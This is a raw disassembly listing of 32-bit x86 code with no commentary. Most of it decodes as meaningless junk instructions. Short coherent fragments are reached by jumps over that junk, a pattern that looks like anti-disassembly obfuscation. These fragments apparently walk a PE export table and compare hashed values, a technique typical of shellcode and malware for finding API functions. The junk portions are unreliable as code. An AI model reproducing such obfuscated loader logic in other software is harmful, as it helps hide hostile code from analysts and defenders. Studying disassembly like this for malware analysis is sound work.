  40f208:	push   edx
  40f209:	sub    ecx,esp
  40f20b:	xchg   ecx,eax
  40f20c:	aam    0x27
  40f20e:	and    eax,0x574dc7e4
  40f213:	mov    ch,dl
  40f215:	xchg   esp,eax
  40f216:	push   edi
  40f217:	mov    esi,0xbc08d88e
  40f21c:	cdq    
  40f21d:	clc    
  40f21e:	sbb    BYTE PTR [edi+0x78],cl
  40f221:	ret    
  40f222:	das    
  40f223:	cmp    dl,BYTE PTR [edx+esi*4+0x48]
  40f227:	retf   0xf4ac
  40f22a:	lahf   
  40f22b:	mov    edi,0xce9d50fa
  40f230:	push   cs
  40f231:	lahf   
  40f232:	dec    edx
  40f233:	je     0x40f219
  40f235:	int    0xeb
  40f237:	dec    ebp
  40f238:	adc    BYTE PTR gs:[edi-0x5d],0x2
  40f23d:	mov    ebx,0x5c2465f1
  40f242:	ss ss das 
  40f245:	ds jmp 0xb93776ff
  40f24b:	cli    
  40f24c:	xlat   BYTE PTR ds:[ebx]
  40f24d:	pop    ecx
  40f24e:	mov    edx,0xc8ac938c
  40f253:	lahf   
  40f254:	retf   
  40f255:	sub    eax,0x34de586f
  40f25a:	or     BYTE PTR [esi+0x7a],dh
  40f25d:	fdivr  DWORD PTR [edi+0x32]
  40f260:	push   0xffffffc2
  40f262:	(bad)  
  40f263:	mov    al,0x45
  40f265:	jle    0x40f2a7
  40f267:	das    
  40f268:	xor    al,0x6a
  40f26a:	cmp    al,0xec
  40f26c:	push   es
  40f26d:	add    al,0xf8
  40f26f:	mov    ecx,0xe6608680
  40f274:	dec    edx
  40f275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f276:	jne    0x40f215
  40f278:	push   esp
  40f279:	retf   0xa7f5
  40f27c:	(bad)  
  40f27d:	into   
  40f27e:	cmp    DWORD PTR [ebx],esp
  40f280:	test   DWORD PTR [ebp+0x31855518],edi
  40f286:	sbb    esi,DWORD PTR [esi+0x22]
  40f289:	push   edx
  40f28a:	jb     0x40f26f
  40f28c:	inc    ecx
  40f28d:	cmc    
  40f28e:	popf   
  40f28f:	scas   al,BYTE PTR es:[edi]
  40f290:	pop    ss
  40f291:	jmp    0x40f2be
  40f293:	mov    esi,0x48492472
  40f298:	pop    esp
  40f299:	fwait
  40f29a:	sub    bx,WORD PTR [ecx]
  40f29d:	inc    ebp
  40f29e:	ds and eax,0xbba77ac9
  40f2a4:	xor    DWORD PTR [edx+edi*1],ebp
  40f2a7:	cwde   
  40f2a8:	xor    DWORD PTR [ebx-0x4f70bf59],ecx
  40f2ae:	mov    esp,0xafe39ab2
  40f2b3:	lods   eax,DWORD PTR ds:[esi]
  40f2b4:	or     al,0xcd
  40f2b6:	repz mov ds:0xf9be02d3,al
  40f2bc:	cmp    edi,ebp
  40f2be:	sbb    edi,DWORD PTR [eax-0x5a]
  40f2c1:	jo     0x40f2ee
  40f2c3:	xchg   bl,cl
  40f2c5:	test   edi,0x341e8900
  40f2cb:	pusha  
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	rol    ah,1
  40f2f8:	add    eax,0xa9763e27
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f310
  40f304:	push   eax
  40f305:	mov    ds:0xeb1638d2,eax
  40f30a:	cmp    eax,0xa5f26ed3
  40f30f:	jbe    0x40f2a5
  40f311:	xchg   ebx,eax
  40f312:	pushf  
  40f313:	ins    BYTE PTR es:[edi],dx
  40f314:	imul   esp
  40f316:	rol    DWORD PTR [ecx+0x6cf01759],1
  40f31c:	int3   
  40f31d:	jb     0x40f30e
  40f31f:	pextrw edi,(bad),0xc5
  40f321:	jns    0x40f31c
  40f323:	aas    
  40f324:	call   FWORD PTR gs:[edi]
  40f327:	xchg   esp,eax
  40f328:	cmp    eax,0x2a6d7a9e
  40f32d:	mov    esi,0x3fb3453f
  40f332:	mov    ah,0xf3
  40f334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f335:	jge    0x40f3a2
  40f337:	dec    ebx
  40f338:	add    DWORD PTR [edx+ecx*8],eax
  40f33b:	xchg   DWORD PTR [edi],ebp
  40f33d:	lods   al,BYTE PTR ds:[esi]
  40f33e:	cmp    eax,0x79d07066
  40f343:	mov    al,ds:0xf503e2c9
  40f348:	mov    esp,0x7d060f49
  40f34d:	mov    dh,0x41
  40f34f:	call   0xdbae2957
  40f354:	cwde   
  40f355:	pop    edi
  40f356:	push   edi
  40f357:	stos   DWORD PTR es:[edi],eax
  40f358:	test   eax,0x59b186ba
  40f35d:	mov    ebp,0x18a4af44
  40f362:	retf   0x9009
  40f365:	dec    edx
  40f366:	adc    eax,edx
  40f368:	inc    ecx
  40f369:	jg     0x40f3ae
  40f36b:	out    dx,eax
  40f36c:	arpl   WORD PTR [edx-0x371c2041],cx
  40f372:	push   ebp
  40f373:	(bad)  
  40f374:	cmp    edx,DWORD PTR [ebx]
  40f376:	pop    ds
  40f377:	or     al,0x6b
  40f379:	mov    ebp,0xc52bf14a
  40f37e:	xchg   ebp,eax
  40f37f:	pop    es
  40f380:	inc    esi
  40f381:	xor    dl,BYTE PTR [edx]
  40f383:	nop
  40f384:	enter  0x23b0,0x16
  40f388:	dec    edx
  40f389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f38a:	into   
  40f38b:	int    0x23
  40f38d:	out    0xc6,al
  40f38f:	lods   eax,DWORD PTR ds:[esi]
  40f390:	scas   al,BYTE PTR es:[edi]
  40f391:	js     0x40f39a
  40f393:	repnz sbb eax,0xd5aac413
  40f399:	jbe    0x40f39d
  40f39b:	mov    ebp,0xf3d5f2d1
  40f3a0:	inc    eax
  40f3a1:	into   
  40f3a2:	in     eax,dx
  40f3a3:	sub    al,0x91
  40f3a5:	and    BYTE PTR ds:0xd36f4b14,dh
  40f3ab:	aaa    
  40f3ac:	test   DWORD PTR [ecx-0x417f2ec6],0x99553a06
  40f3b6:	and    BYTE PTR [eax+0x4c2e4f6e],dl
  40f3bc:	mov    ah,0xa2
  40f3be:	std    
  40f3bf:	push   edx
  40f3c0:	lea    edx,[ebx+0x21]
  40f3c3:	xor    DWORD PTR ds:[edx+esi*4],0xfe648d4a
  40f3cb:	daa    
  40f3cc:	or     DWORD PTR [edx+0x16],ebp
  40f3cf:	xlat   BYTE PTR ds:[ebx]
  40f3d0:	inc    ecx
  40f3d1:	es xchg bh,cl
  40f3d4:	or     al,0x42
  40f3d6:	mov    bh,0xe0
  40f3d8:	outs   dx,DWORD PTR ds:[esi]
  40f3d9:	in     al,0x77
  40f3db:	and    ebp,0x12
  40f3de:	mov    ah,dl
  40f3e0:	gs in  al,dx
  40f3e2:	xlat   BYTE PTR ds:[ebx]
  40f3e3:	sbb    BYTE PTR [ebp-0x13],dl
  40f3e6:	test   eax,0xb5cb2ac3
  40f3eb:	add    esi,DWORD PTR [ebp-0x42b06a12]
  40f3f1:	jbe    0x40f41a
  40f3f3:	int3   
  40f3f4:	test   BYTE PTR [edi-0x37],al
  40f3f7:	jb     0x40f392
  40f3f9:	aas    
  40f3fa:	mov    ds:0x6b8b2f55,eax
  40f3ff:	add    al,0x74
  40f401:	inc    esp
  40f402:	push   ecx
  40f403:	scas   eax,DWORD PTR es:[edi]
  40f404:	stc    
  40f405:	pop    es
  40f406:	sub    eax,0xfd6fb0f
  40f40b:	std    
  40f40c:	jno    0x40f3cf
  40f40e:	mov    ah,0xf0
  40f410:	pop    ecx
  40f411:	div    DWORD PTR [edx+0x1c01b6c4]
  40f417:	bound  ecx,QWORD PTR [ebx+0x3e5f52a3]
  40f41d:	xchg   esi,eax
  40f41e:	or     BYTE PTR [ebx+ebp*1+0x280cc7d5],0x2f
  40f426:	cmp    dh,BYTE PTR [edx-0x68]
  40f429:	jno    0x40f3e3
  40f42b:	sub    cl,bl
  40f42d:	mov    cl,BYTE PTR [esi-0x7aa1d640]
  40f433:	pushf  
  40f434:	leave  
  40f435:	push   0xe4e983b0
  40f43a:	xor    BYTE PTR [ebp+0x23d71ce2],dh
  40f440:	and    edx,DWORD PTR [esp+ebx*2]
  40f443:	data16 cmc 
  40f445:	fist   DWORD PTR [ebx]
  40f447:	(bad)  
  40f449:	push   cs
  40f44a:	bound  ebp,QWORD PTR [eax+0x183065c2]
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	int    0x17
  40f466:	enter  0x39a0,0xb7
  40f46a:	jo     0x40f4dc
  40f46c:	ret    
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f3f5
  40f471:	inc    ebp
  40f472:	ins    DWORD PTR es:[edi],dx
  40f473:	test   al,0x17
  40f475:	and    eax,0xda88502a
  40f47a:	lods   eax,DWORD PTR ds:[esi]
  40f47b:	sub    eax,0x15c463b7
  40f480:	iret   
  40f481:	mov    BYTE PTR [edi+eax*8],ch
  40f484:	fimul  WORD PTR [ecx]
  40f486:	pop    ebx
  40f487:	push   0x6f
  40f489:	popa   
  40f48a:	pop    ds
  40f48b:	test   esp,ebx
  40f48d:	(bad)  
  40f48e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f48f:	int    0x12
  40f491:	jl     0x40f42a
  40f493:	std    
  40f494:	ss and edi,esi
  40f497:	test   BYTE PTR [esi],bh
  40f499:	in     eax,0xfa
  40f49b:	mov    esp,0xf29a712f
  40f4a0:	outs   dx,DWORD PTR ds:[esi]
  40f4a1:	jo     0x40f4e8
  40f4a3:	loopne 0x40f498
  40f4a5:	pusha  
  40f4a6:	jmp    0x7eb:0x39deee55
  40f4ad:	mov    es,WORD PTR [ebx]
  40f4af:	loop   0x40f4cb
  40f4b1:	jno    0x40f45e
  40f4b3:	data16 jnp 0x40f510
  40f4b6:	inc    esp
  40f4b7:	pusha  
  40f4b8:	test   eax,0x1c31fc51
  40f4bd:	(bad)  [ecx-0x30]
  40f4c0:	lods   al,BYTE PTR ds:[esi]
  40f4c1:	mov    al,0xd2
  40f4c3:	fstp   st(1)
  40f4c5:	shl    bh,0x82
  40f4c8:	loope  0x40f461
  40f4ca:	xchg   DWORD PTR [eax],ebp
  40f4cc:	xchg   edi,eax
  40f4cd:	jnp    0x40f521
  40f4cf:	add    bh,BYTE PTR ds:0x5684ad11
  40f4d5:	fdivr  DWORD PTR [esi-0x331162ee]
  40f4db:	cwde   
  40f4dc:	inc    esp
  40f4dd:	sbb    bl,BYTE PTR [ebx-0x753736cd]
  40f4e3:	dec    esi
  40f4e4:	pop    esi
  40f4e5:	push   edi
  40f4e6:	push   ebp
  40f4e7:	fnstcw WORD PTR [eax+0x10]
  40f4ea:	test   al,0x9e
  40f4ec:	call   0xc4408bef
  40f4f1:	adc    al,0x5
  40f4f3:	das    
  40f4f4:	test   al,0x17
  40f4f6:	mov    BYTE PTR [edx+0x4766c753],ah
  40f4fc:	test   BYTE PTR [eax+ebp*8+0x39bb6c37],bh
  40f503:	adc    al,0xf5
  40f505:	mov    ds:0x96b1ad0,al
  40f50a:	fild   WORD PTR [ebx]
  40f50c:	inc    esi
  40f50d:	fwait
  40f50e:	mov    DWORD PTR [edi-0x11588841],eax
  40f514:	cwde   
  40f515:	cmp    dh,BYTE PTR [eax-0x19780bb5]
  40f51b:	inc    edi
  40f51c:	fstsw  WORD PTR [eax+edi*8]
  40f520:	push   0x4e
  40f522:	push   esp
  40f523:	stc    
  40f524:	ja     0x40f507
  40f526:	pop    esp
  40f527:	mov    cl,0x9c
  40f529:	std    
  40f52a:	push   edx
  40f52b:	pop    eax
  40f52c:	inc    ebx
  40f52d:	lods   eax,DWORD PTR ds:[esi]
  40f52e:	repz test BYTE PTR [ebx-0x4e7cb792],0xa8
  40f536:	sub    ch,BYTE PTR ds:0x573bfe78
  40f53c:	xchg   esp,eax
  40f53d:	mov    eax,ds:0xdb9edbdf
  40f542:	xor    bh,cl
  40f544:	movhps QWORD PTR [edx],xmm3
  40f547:	mov    edi,0x9ed384c7
  40f54c:	push   ds
  40f54d:	add    BYTE PTR [edi+0x5f],dh
  40f550:	rcl    DWORD PTR [eax+0x58],cl
  40f553:	or     ah,ah
  40f555:	cld    
  40f556:	inc    esp
  40f557:	cmp    eax,0x2db3256c
  40f55c:	and    BYTE PTR [esi+0x290d2430],0x49
  40f563:	gs push 0x3
  40f566:	adc    dh,cl
  40f568:	jbe    0x40f53e
  40f56a:	push   esi
  40f56b:	(bad)  
  40f56c:	retf   0x33fa
  40f56f:	ins    DWORD PTR es:[edi],dx
  40f570:	fsub   DWORD PTR ds:0x9af15da0
  40f576:	jecxz  0x40f51a
  40f578:	cmp    eax,0xa0823774
  40f57d:	push   cs
  40f57e:	call   0x79e1:0x9edd5754
  40f585:	in     al,dx
  40f586:	xchg   edi,eax
  40f587:	mov    DWORD PTR [ebp+ebx*1-0x3d],eax
  40f58b:	inc    ebp
  40f58c:	ficomp WORD PTR [eax-0x6c]
  40f58f:	push   edi
  40f590:	jmp    0xbd41fd04
  40f595:	cdq    
  40f596:	mov    dh,0x4c
  40f598:	rcl    BYTE PTR [esi],0x37
  40f59b:	sbb    edx,DWORD PTR [esi+0x5f11138d]
  40f5a1:	call   0xeb61:0x933838f9
  40f5a8:	repnz xchg ebp,eax
  40f5aa:	cmp    DWORD PTR [ebx],ebp
  40f5ac:	inc    edi
  40f5ad:	nop
  40f5ae:	dec    ebx
  40f5af:	inc    ebp
  40f5b0:	pop    edi
  40f5b1:	xchg   DWORD PTR [eax-0x6b31d46e],esi
  40f5b7:	cdq    
  40f5b8:	pop    ecx
  40f5b9:	fs jae 0x40f55d
  40f5bc:	push   ds
  40f5bd:	mov    eax,DWORD PTR [eax]
  40f5bf:	mov    eax,DWORD PTR [eax+0x3c]
  40f5c2:	lea    ecx,[ecx*8+0x78]
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	mov    eax,ds:0x8c43cec4
  40f608:	mov    dh,0x70
  40f60a:	jo     0x40f5cf
  40f60c:	jg     0x40f67e
  40f60e:	jo     0x40f65f
  40f610:	pop    edx
  40f611:	iret   
  40f612:	test   eax,0x75f63e23
  40f617:	out    0x3f,al
  40f619:	jg     0x40f656
  40f61b:	xchg   esi,eax
  40f61c:	stos   BYTE PTR es:[edi],al
  40f61d:	(bad)  
  40f61e:	sbb    DWORD PTR ds:0x2807becb,esp
  40f624:	mov    esp,DWORD PTR [edx]
  40f626:	add    edi,DWORD PTR [edi]
  40f628:	lods   eax,DWORD PTR ds:[esi]
  40f629:	xor    al,0xdb
  40f62b:	sub    dh,BYTE PTR ds:0xccbdaabb
  40f631:	jnp    0x40f5ca
  40f633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f634:	ja     0x40f611
  40f636:	pop    ds
  40f637:	cmp    BYTE PTR [ecx+esi*2-0x64],bh
  40f63b:	hlt    
  40f63c:	mov    ds:0xaed546a2,eax
  40f641:	retf   0x8004
  40f644:	xor    DWORD PTR [edx],eax
  40f646:	adc    eax,0x79009845
  40f64b:	xchg   esp,eax
  40f64c:	jmp    0x40f6a2
  40f64e:	xchg   edx,eax
  40f64f:	(bad)  
  40f650:	and    DWORD PTR [ebx],esp
  40f652:	add    BYTE PTR [ecx],bl
  40f654:	mov    esi,DWORD PTR [edi+0x37ee42b5]
  40f65a:	in     al,0x1
  40f65c:	xor    edx,DWORD PTR [eax-0x784e9759]
  40f662:	fld    DWORD PTR [ecx]
  40f664:	pop    ecx
  40f665:	xchg   esp,eax
  40f666:	dec    ecx
  40f667:	(bad)  
  40f668:	scas   al,BYTE PTR es:[edi]
  40f669:	push   es
  40f66a:	pop    ebp
  40f66b:	aam    0xce
  40f66d:	stos   DWORD PTR es:[edi],eax
  40f66e:	cdq    
  40f66f:	je     0x40f69d
  40f671:	xor    edx,0xffffff8c
  40f674:	dec    eax
  40f675:	mov    edi,0xf10c90bb
  40f67a:	xlat   BYTE PTR ds:[ebx]
  40f67b:	loope  0x40f611
  40f67d:	retf   0x150b
  40f680:	sub    DWORD PTR [ebp+0x50aefe16],ebx
  40f686:	add    BYTE PTR [ebx-0x34],ch
  40f689:	daa    
  40f68a:	lahf   
  40f68b:	cs hlt 
  40f68d:	xchg   edi,eax
  40f68e:	jecxz  0x40f61d
  40f690:	jp     0x40f61a
  40f692:	mov    edx,0x66003d63
  40f697:	cs xor al,0xb3
  40f69a:	cwde   
  40f69b:	(bad)  
  40f69c:	adc    dl,dh
  40f69e:	repnz cs xchg ebp,eax
  40f6a1:	ja     0x40f62b
  40f6a3:	adc    eax,esi
  40f6a5:	mov    al,ds:0x18439436
  40f6aa:	pop    edi
  40f6ab:	(bad)  
  40f6ac:	jno    0x40f6b4
  40f6ae:	aad    0xaa
  40f6b0:	out    0xc6,al
  40f6b2:	xor    eax,0xa8bad94e
  40f6b7:	adc    cl,ch
  40f6b9:	dec    edi
  40f6ba:	pop    ebx
  40f6bb:	push   0xace928c7
  40f6c0:	jns    0x40f680
  40f6c2:	push   esi
  40f6c3:	imul   edx,DWORD PTR [edi+0x7aeeb534],0x6f
  40f6ca:	imul   eax,DWORD PTR [esi],0xffffffc6
  40f6cd:	sbb    ebp,DWORD PTR [esi+edx*2+0x4a]
  40f6d1:	mov    eax,0xa6af427a
  40f6d6:	mov    ebx,gs
  40f6d8:	xchg   edi,eax
  40f6d9:	pop    ebx
  40f6da:	sub    eax,0x92107b25
  40f6df:	fwait
  40f6e0:	pop    ebx
  40f6e1:	xchg   ebx,eax
  40f6e2:	retf   
  40f6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6e4:	inc    ebx
  40f6e5:	test   eax,0xce339ee9
  40f6ea:	out    0xe0,eax
  40f6ec:	out    dx,al
  40f6ed:	mov    edi,DWORD PTR [eax]
  40f6ef:	addr16 dec edx
  40f6f1:	test   eax,0x523c93e2
  40f6f6:	stc    
  40f6f7:	stos   BYTE PTR es:[edi],al
  40f6f8:	(bad)  
  40f6f9:	jmp    0x40f6dd
  40f6fb:	mov    bl,0x4f
  40f6fd:	loope  0x40f722
  40f6ff:	in     al,0x36
  40f701:	es jp  0x40f769
  40f704:	pop    es
  40f705:	adc    BYTE PTR [ecx-0x1a],al
  40f708:	xor    al,0xb1
  40f70a:	pushf  
  40f70b:	jp     0x40f770
  40f70d:	xchg   ebp,eax
  40f70e:	not    DWORD PTR [edi]
  40f710:	push   es
  40f711:	in     al,dx
  40f712:	lahf   
  40f713:	lock or DWORD PTR [edx],edi
  40f716:	not    DWORD PTR [esi-0x36bfffe5]
  40f71c:	popa   
  40f71d:	jne    0x40f6fd
  40f71f:	out    dx,al
  40f720:	or     dl,BYTE PTR [ecx+edi*1-0x6ef1d41d]
  40f727:	(bad)  
  40f728:	mov    ds:0x67b78a66,al
  40f72d:	jae    0x40f7a6
  40f72f:	pop    ecx
  40f730:	scas   al,BYTE PTR es:[edi]
  40f731:	inc    edx
  40f732:	xchg   ebp,eax
  40f733:	pop    ebx
  40f734:	mov    edx,0xd1823f96
  40f739:	xor    edi,DWORD PTR [eax+0x5ff65628]
  40f73f:	adc    DWORD PTR [eax],ebx
  40f741:	aad    0xb5
  40f743:	and    edi,DWORD PTR [esi+0x6a]
  40f746:	jmp    0x40f71a
  40f748:	jle    0x40f704
  40f74a:	(bad)  
  40f74b:	pop    ecx
  40f74c:	stc    
  40f74d:	js     0x40f709
  40f74f:	add    ch,BYTE PTR [ebp+0x67c58ec4]
  40f755:	fbstp  TBYTE PTR [edi+0x5d0ca971]
  40f75b:	push   ss
  40f75c:	mov    eax,DWORD PTR [ebp-0x8]
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x464746f3
  40f7e3:	test   DWORD PTR [esi+0x7070b55f],0x70707da3
  40f7ed:	(bad)  
  40f7ee:	push   ss
  40f7ef:	pop    ss
  40f7f0:	mov    edx,0xc51536bf
  40f7f5:	dec    esp
  40f7f6:	aad    0xcd
  40f7f8:	jl     0x40f864
  40f7fa:	repnz adc al,BYTE PTR [edi-0x4f8a6ded]
  40f801:	repnz pop eax
  40f803:	jl     0x40f81f
  40f805:	loopne 0x40f7ec
  40f807:	push   ebx
  40f808:	sbb    al,0xe0
  40f80a:	lods   eax,DWORD PTR ds:[esi]
  40f80b:	popf   
  40f80c:	rol    BYTE PTR [edx],1
  40f80e:	jno    0x40f851
  40f810:	and    DWORD PTR [ecx],ebp
  40f812:	inc    ebx
  40f813:	retf   
  40f814:	mov    cl,0xb2
  40f816:	xchg   esi,eax
  40f817:	or     BYTE PTR [edx],dl
  40f819:	sbb    DWORD PTR [ebp+0x74a9a225],ebx
  40f81f:	call   0x312b:0x971a6943
  40f826:	loopne 0x40f7a8
  40f828:	ss push edx
  40f82a:	xchg   BYTE PTR [edx+ebp*4],ah
  40f82d:	xlat   BYTE PTR ds:[ebx]
  40f82e:	outs   dx,BYTE PTR ds:[esi]
  40f82f:	jmp    0x4c9b49e1
  40f834:	cli    
  40f835:	push   eax
  40f836:	dec    ebx
  40f837:	cmp    ecx,eax
  40f839:	hlt    
  40f83a:	jnp    0x40f7c6
  40f83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f83d:	cmp    DWORD PTR [edi-0x20ef2e6],edx
  40f843:	sub    BYTE PTR [ebp-0x4c95ffae],ah
  40f849:	sar    bl,1
  40f84b:	mov    ah,BYTE PTR ds:0x153d09c4
  40f851:	dec    ebx
  40f852:	in     eax,dx
  40f853:	adc    ecx,DWORD PTR [ebx+0xf]
  40f856:	ss xchg ebp,eax
  40f858:	cmp    ch,BYTE PTR [ebx-0x1264a7ec]
  40f85e:	or     ebx,ecx
  40f860:	retf   
  40f861:	mov    cl,BYTE PTR [esi]
  40f863:	(bad)  
  40f864:	and    ecx,edx
  40f866:	sbb    al,0xbd
  40f868:	mov    cs,WORD PTR [edi]
  40f86a:	mov    ebx,0x245ef566
  40f86f:	mov    al,ds:0x58d73a74
  40f874:	cmp    ecx,DWORD PTR [eax+0x6a3acea]
  40f87a:	jbe    0x40f860
  40f87c:	and    dh,BYTE PTR [eax+0x1e]
  40f87f:	and    edi,DWORD PTR [edi]
  40f881:	je     0x40f803
  40f883:	or     al,0x25
  40f885:	sub    DWORD PTR [ecx-0x1b],edx
  40f888:	daa    
  40f889:	loope  0x40f829
  40f88b:	mov    al,0x2a
  40f88d:	(bad)  
  40f88e:	adc    ah,bh
  40f890:	dec    ecx
  40f891:	cwde   
  40f892:	mov    al,0x40
  40f894:	sbb    al,0x77
  40f896:	ret    
  40f897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f898:	int    0xc0
  40f89a:	sahf   
  40f89b:	pop    ss
  40f89c:	mov    edx,0x3318066c
  40f8a1:	pop    esp
  40f8a2:	js     0x40f8b2
  40f8a4:	mov    edi,edx
  40f8a6:	test   eax,0x66fd274b
  40f8ab:	push   edi
  40f8ac:	sbb    al,0xe1
  40f8ae:	hlt    
  40f8af:	stos   DWORD PTR es:[edi],eax
  40f8b0:	(bad)  [edx+ebp*4-0x76990a44]
  40f8b7:	jne    0x40f890
  40f8b9:	inc    esi
  40f8ba:	mov    ebx,0xe80bcd40
  40f8bf:	cld    
  40f8c0:	bnd jae 0x40f90b
  40f8c3:	mov    al,0xb3
  40f8c5:	out    0xfe,al
  40f8c7:	jp     0x40f917
  40f8c9:	or     BYTE PTR [eax-0x8a8c849],dh
  40f8cf:	les    edi,FWORD PTR [ebx-0x14]
  40f8d2:	jbe    0x40f8f8
  40f8d4:	jmp    0x40f886
  40f8d6:	lahf   
  40f8d7:	stos   BYTE PTR es:[edi],al
  40f8d8:	push   esi
  40f8d9:	(bad)  
  40f8da:	jns    0x40f955
  40f8dc:	(bad)  
  40f8dd:	xlat   BYTE PTR ds:[ebx]
  40f8de:	stc    
  40f8df:	add    ebx,DWORD PTR [esp+ebp*4+0x7c]
  40f8e3:	outs   dx,DWORD PTR es:[esi]
  40f8e5:	mov    cl,0x4e
  40f8e7:	push   esp
  40f8e8:	add    al,0xe9
  40f8ea:	(bad)  [esi+0x1515b87d]
  40f8f0:	adc    bl,ah
  40f8f2:	sbb    ecx,DWORD PTR [edi]
  40f8f4:	fwait
  40f8f5:	push   cs
  40f8f6:	mov    esi,0x85d3bff3
  40f8fb:	add    DWORD PTR [esi],esi
  40f8fd:	push   ecx
  40f8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ff:	ds dec esi
  40f901:	pop    ecx
  40f902:	bound  eax,QWORD PTR ds:0x5e8980b
  40f908:	enter  0xef5c,0xea
  40f90c:	inc    ebp
  40f90d:	mov    DWORD PTR [esi+0x5a],ecx
  40f910:	inc    esi
  40f911:	shl    BYTE PTR [eax-0x181038de],cl
  40f917:	jle    0x40f8bb
  40f919:	ret    0x2391
  40f91c:	cmp    DWORD PTR [ebp+0x34],edx
  40f91f:	sub    BYTE PTR ds:0x4c7dda64,al
  40f925:	mov    esp,0x34004d1f
  40f92a:	cmp    al,0x52
  40f92c:	psraw  mm0,QWORD PTR ds:0xab91875
  40f933:	lock mov ecx,0xd6185577
  40f939:	arpl   dx,cx
  40f93b:	and    BYTE PTR [esi+eiz*1+0x727b016e],0x8c
  40f943:	push   0xffffffe7
  40f945:	xor    DWORD PTR [edi],eax
  40f947:	xchg   ecx,eax
  40f948:	gs sub ax,0x54bf
  40f94d:	push   esi
  40f94e:	loope  0x40f970
  40f950:	cmp    eax,0x17b7cad3
  40f955:	(bad)  
  40f956:	mov    cs,esp
  40f958:	je     0x40f9d9
  40f95a:	xor    al,0x31
  40f95c:	ret    0xd557
  40f95f:	popf   
  40f960:	std    
  40f961:	jecxz  0x40f910
  40f963:	retf   
  40f964:	xchg   ebx,eax
  40f965:	fild   QWORD PTR ds:0x7d0009e7
  40f96b:	vpaddsb ymm6,ymm6,ymm6
  40f96f:	inc    edi
  40f970:	imul   eax,DWORD PTR [ebx-0x3f],0x2f
  40f974:	pop    edx
  40f975:	into   
  40f976:	sbb    DWORD PTR [ebx],esp
  40f978:	jl     0x40f999
  40f97a:	and    eax,0x1f12412d
  40f97f:	mov    bl,0x94
  40f981:	push   edx
  40f982:	dec    edi
  40f983:	jbe    0x40f9c8
